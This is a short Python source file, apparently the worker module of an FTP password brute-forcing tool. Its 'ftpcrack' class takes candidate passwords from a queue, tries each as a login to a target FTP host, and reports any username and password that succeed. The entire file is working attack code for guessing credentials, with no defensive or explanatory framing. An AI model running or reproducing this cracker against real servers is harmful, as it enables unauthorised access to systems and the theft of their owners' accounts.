import time
import ftplib

class ftpcrack:
    def __init__(self,op,args):
        self.op=op
        self.args=args

    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)

            try:
                f=ftplib.FTP()
                f.connect(self.op.host,port=self.op.port)
                f.login(username,passwd)
                outputq.put((username,passwd))

                time.sleep(0.5)
                exit(1)
            except Exception as e:
                if self.op.verbose!=None:
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd:%s" % (username, passwd))





